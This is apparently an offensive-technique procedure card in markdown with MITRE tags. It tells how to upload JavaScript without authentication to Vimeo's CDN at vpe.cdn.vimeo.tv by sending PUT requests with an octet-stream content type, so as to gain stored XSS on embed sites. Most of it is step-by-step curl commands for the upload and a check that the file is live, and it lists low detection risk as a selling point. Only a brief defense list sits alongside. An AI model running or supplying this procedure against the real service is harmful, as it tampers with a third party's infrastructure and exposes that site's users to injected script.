---
id: proc-vimeo-cdn-upload-001
name: Upload-Malicious-JS-to-Vimeo-CDN
tags:
  - file-upload
  - access-control
  - cdn
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-put-upload-xss-to-vimeo-cdn]]'
verified: false
platforms:
  - Web
  - GCP
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-13T23:55:06.803Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Upload-Malicious-JS-to-Vimeo-CDN

## Summary

This procedure exploits improper access control on vpe.cdn.vimeo.tv by sending unauthenticated PUT requests with application/octet-stream Content-Type to upload or overwrite arbitrary JavaScript files containing XSS payloads, bypassing Google Cloud Storage authentication.

## Description

The Vimeo CDN at vpe.cdn.vimeo.tv fails to enforce authentication for PUT requests when the Content-Type is blank or application/octet-stream, allowing attackers to upload files to arbitrary paths like /something.js. Other Content-Types trigger GCS auth errors. Uploaded JS files can then be served to embed.vhx.tv, enabling stored XSS. This targets web environments with public CDN access and no rate limiting on uploads.

## Requirements

1. Network access to vpe.cdn.vimeo.tv over HTTPS
2. Tool like curl for crafting HTTP requests
3. Knowledge of HTTP PUT method and headers

## Defense

Defensive measures and detection strategies:

- Enforce authentication and validation on all CDN upload endpoints
- Restrict allowed Content-Types and scan uploads for malicious code
- Monitor for anomalous PUT requests to CDN paths and alert on high-volume uploads

## Objectives

1. Upload a malicious JS file to the CDN without authentication
2. Overwrite existing files if needed to inject payloads
3. Enable subsequent XSS execution on linked embed sites

## Instructions

### Step 1: Craft and Send PUT Request

**Context**: Prepare an HTTP PUT request to an arbitrary path with the XSS payload in the body, using application/octet-stream to bypass auth.

**Command** ([[commands/curl-put-upload-xss-to-vimeo-cdn]]):
```bash
curl -X PUT https://vpe.cdn.vimeo.tv/something.js \
  -H "Content-Type: application/octet-stream" \
  -H "Content-Length: 10" \
  --data "alert(document.domain)" \
  --connect-timeout 10
```

> This command uploads the payload "alert(document.domain)" as /something.js. Expected output is a 200 OK response if successful; errors occur only for non-bypassable Content-Types.

### Step 2: Verify Upload

**Context**: Fetch the uploaded file to confirm it is stored and retrievable.

**Command** ([[commands/curl-put-upload-xss-to-vimeo-cdn]] variant for GET):
```bash
curl -X GET https://vpe.cdn.vimeo.tv/something.js
```

> Output should match the payload, confirming the file is live on the CDN.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/curl-put-upload-xss-to-vimeo-cdn]]

## Tools Used

- [[tools/curl]]

## Tags

- file-upload
- access-control
- cdn
